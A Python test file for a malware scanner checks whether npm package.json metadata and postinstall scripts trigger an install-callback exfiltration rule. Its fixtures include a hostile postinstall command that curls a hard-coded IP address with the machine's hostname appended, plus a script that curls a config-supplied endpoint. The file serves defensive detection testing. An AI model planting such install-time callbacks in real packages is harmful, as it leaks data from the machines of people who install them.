"""A manifest's project metadata names hosts npm never contacts at install (review 98 G6)."""

from __future__ import annotations

import json

from cordon_scanner import Scanner
from cordon_scanner.analysis.shared.documentation import DocumentationSpans
from cordon_scanner.foundation.config import Config
from cordon_scanner.foundation.text.comments import SourceComments

RULE = "MALWARE.EXFIL.INSTALL_CALLBACK.001"
HOST = "http://123.60.156.158:13000"


class ManifestHelpers:
    @staticmethod
    def rules(tmp_path, manifest: dict) -> set[str]:
        (tmp_path / "package.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
        result = Scanner(Config.default().with_overrides(use_cache=False)).scan(tmp_path)
        return {f.rule_id for f in result.findings}

    @staticmethod
    def base(**extra: object) -> dict:
        return {
            "name": "engine",
            "version": "1.0.0",
            "scripts": {"postinstall": "node x.js"},
            **extra,
        }


class TestMetadataIsNotACallback:
    def test_where_the_source_is_kept(self, tmp_path) -> None:
        manifest = ManifestHelpers.base(
            repository={"type": "git", "url": f"{HOST}/engine.git"},
            homepage=f"{HOST}/engine",
            bugs={"url": f"{HOST}/engine/issues"},
        )
        assert RULE not in ManifestHelpers.rules(tmp_path, manifest)

    def test_a_script_that_calls_the_host_still_is(self, tmp_path) -> None:
        manifest = ManifestHelpers.base(repository={"url": f"{HOST}/engine.git"})
        manifest["scripts"]["postinstall"] = f"curl {HOST}/i?h=$(hostname)"
        assert RULE in ManifestHelpers.rules(tmp_path, manifest)

    def test_a_config_value_a_script_reads_still_is(self, tmp_path) -> None:
        manifest = ManifestHelpers.base(config={"endpoint": f"{HOST}/collect"})
        manifest["scripts"]["postinstall"] = "curl $npm_package_config_endpoint"
        assert RULE in ManifestHelpers.rules(tmp_path, manifest)


class TestSpans:
    def test_only_top_level_metadata_of_a_named_object(self) -> None:
        raw = json.dumps(
            {"name": "x", "homepage": "h", "config": {"homepage": "c"}, "author": {"url": "a"}}
        ).encode()
        spans = DocumentationSpans.manifest_metadata(raw)
        covered = {raw[s:e].decode() for s, e in spans}
        assert covered == {'"h"', '{"url": "a"}'}

    def test_an_object_without_a_name_is_not_a_manifest(self) -> None:
        assert DocumentationSpans.manifest_metadata(b'{"homepage": "h"}') == ()

    def test_a_dependency_fetched_from_a_host_is_not_metadata(self) -> None:
        # The remote-tarball shape: npm fetches it at install.
        raw = json.dumps(
            {"name": "x", "homepage": "h", "dependencies": {"y": f"{HOST}/y.tgz"}}
        ).encode()
        spans = DocumentationSpans.manifest_metadata(raw)
        at = raw.index(HOST.encode())
        assert not SourceComments.inside_spans(spans, at)
